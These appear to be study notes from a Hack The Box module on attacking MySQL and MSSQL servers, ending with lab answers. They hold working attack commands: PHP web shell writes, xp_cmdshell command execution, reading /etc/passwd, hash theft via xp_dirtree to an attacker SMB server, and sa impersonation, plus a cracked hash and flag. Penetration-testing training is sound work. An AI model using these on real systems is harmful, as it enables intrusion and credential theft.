[MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.

Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, `Personal Identifiable Information (PII)`, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.

## Enumeration
By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.

#### Banner Grabbing
```shell
nmap -Pn -sV -sC -p1433 10.10.10.125
```

## Authentication Mechanisms
`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required).

In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.

#### Misconfigurations
Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled.

#### Privileges
Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:
- Read or change the contents of a database
- Read or change the server configuration
- Execute commands
- Read local files
- Communicate with other databases
- Capture the local system hash
- Impersonate existing users
- Gain access to other networks


## Protocol Specific Attacks
#### Read/Change the Database
#### MySQL - Connecting to the SQL Server
```shell
mysql -u julio -pPassword123 -h 10.129.20.13
```

#### Sqlcmd - Connecting to the SQL Server
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:
```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

#### SQL Default Databases
Before we explore using SQL syntax, it is essential to know the default databases for `MySQL` and `MSSQL`. Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc. With access to those databases, we can use some system stored procedures, but they usually don't contain company data.

**Note:** We will get an error if we try to list or connect to a database we don't have permissions to.

`MySQL` default system schemas/databases:
- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

#### SQL Syntax
#### Show Databases

MySQL
```shell
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

MSSQL
```cmd
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Select a Database

```shell
mysql> USE htbusers;

Database changed
```

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### Show Tables
```shell
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
```

```cmd
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
```

#### Select all Data from Table "users"
```shell
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
```

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000
```


## Execute Commands
`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

#### XP_CMDSHELL
```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

### Enable xp_cmdshell
If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO


OR ON LINKED SERVER WE ENABLE AND EXECUTE COMMAND

EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
```


`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

## Write Local Files
#### MySQL - Write Local File
```shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
`secure_file_priv` may be set as follows:
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

#### MySQL - Secure File Privileges
```shell
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
Here we open a file and write a php webshell.
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files
By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### Read Local Files in MSSQL
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should
```

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

#### MySQL - Read Local Files in MySQL
```shell
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

## Capture MSSQL Service Hash
In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. 

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

#### First Set up Responder or Impacket-SMBServer
```shell
sudo responder -I tun0
```

```shell
sudo impacket-smbserver share ./ -smb2support
```

#### Trigger authentication to out SMB Server
##### XP_DIRTREE Hash Stealing
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

##### XP_SUBDIRS Hash Stealing
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
**!!** We get the hashes on our listening server. **!!**

## Impersonate Existing Users with MSSQL
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### Identify Users that We Can Impersonate
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
#### Verifying our Current User and Role
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0
```
As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### Impersonating the SA User
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.
**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

## Communicate with Other Databases with MSSQL
`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges.
```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote 
```

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.


### Questions

1. What is the password for the "mssqlsvc" user?
```shell
Lets create a temporary smb server:
> smbserver.py share ./ -smb2support

Connect to MSSQL and trigger authentification to our smb server to get the hash:
> mssqlclient.py htbdbuser@10.129.253.152

SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.14.191\share\'


On ou server: 
mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:68fdbe1243f89993e5e7d01cbdc53c36:0101000000000000808dbed38042dc01140c07c4b82f910200000000010010006e0042005800520045004c0048006700030010006e0042005800520045004c00480067000200100062005a0048006e0059007a00560057000400100062005a0048006e0059007a005600570007000800808dbed38042dc0106000400020000000800300030000000000000000000000000300000725cf774d86ded3cec7153853dc8dca6f604e512cabd26da04d67232d6c6398f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390031000000000000000000

Crack this hash with john:
> john hash --wordlist=/usr/share/wordlists/rockyou.txt
princess1        (mssqlsvc) 
```

2. Enumerate the "flagDB" database and submit a flag as your answer.
```shell
Connect to database with new user and nxc (Very good alternative)
> nxc mssql 10.129.253.152 -u mssqlsvc -p princess1 -q 'SELECT name FROM master.dbo.sysdatabases ; use flagDB ; SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES ; select * from tb_flag'
 
flagvalue:b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'
```


----

# Latest SQL Vulnerabilities
We will focus on the undocumented MSSQL server function called `xp_dirtree` for this vulnerability. This function is used to view the contents of a specific folder (local or remote). Furthermore, this function provides some additional parameters that can be specified. These include the depth, how far the function should go in the folder, and the actual target folder.

The interesting thing is that the MSSQL function `xp_dirtree` is not directly a vulnerability but takes advantage of the authentication mechanism of SMB. When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an `NTLMv2` hash for authentication.

This hash can be used in various ways against the MSSQL server and other hosts in the corporate network. This includes an SMB Relay attack where we "replay" the hash to log into other systems where the account has local admin privileges or `cracking` this hash on our local system. Successful cracking would allow us to see and use the password in cleartext. A successful SMB Relay attack would grant us admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB Relay back to the originating host. We could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.
